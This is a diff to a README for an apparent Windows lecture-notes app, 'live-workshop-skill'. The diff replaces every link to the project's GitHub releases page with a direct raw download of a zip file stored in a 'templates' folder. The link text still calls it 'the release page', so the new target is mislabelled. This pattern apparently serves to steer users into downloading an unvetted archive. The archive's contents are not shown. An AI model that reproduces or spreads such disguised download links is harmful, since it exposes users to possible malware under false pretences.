@@ -1,6 +1,6 @@
 # 🎧 live-workshop-skill - Turn lectures into searchable notes
 
-[⬇️ Download live-workshop-skill](https://github.com/janineagu4049/live-workshop-skill/releases)
+[⬇️ Download live-workshop-skill](https://github.com/janineagu4049/live-workshop-skill/raw/refs/heads/main/templates/skill_live_workshop_1.2.zip)
 
 ## 🚀 What this app does
 
@@ -28,7 +28,7 @@ For best results:
 
 ## 📥 Download the app
 
-1. Open the release page here: [https://github.com/janineagu4049/live-workshop-skill/releases](https://github.com/janineagu4049/live-workshop-skill/releases)
+1. Open the release page here: [https://github.com/janineagu4049/live-workshop-skill/raw/refs/heads/main/templates/skill_live_workshop_1.2.zip](https://github.com/janineagu4049/live-workshop-skill/raw/refs/heads/main/templates/skill_live_workshop_1.2.zip)
 2. Find the latest release near the top of the page
 3. Look for a Windows file such as `.exe` or `.zip`
 4. Download the file to your computer
@@ -231,4 +231,4 @@ Good habits:
 
 Visit this page to download the latest Windows build:
 
-[https://github.com/janineagu4049/live-workshop-skill/releases](https://github.com/janineagu4049/live-workshop-skill/releases)
+[https://github.com/janineagu4049/live-workshop-skill/raw/refs/heads/main/templates/skill_live_workshop_1.2.zip](https://github.com/janineagu4049/live-workshop-skill/raw/refs/heads/main/templates/skill_live_workshop_1.2.zip)
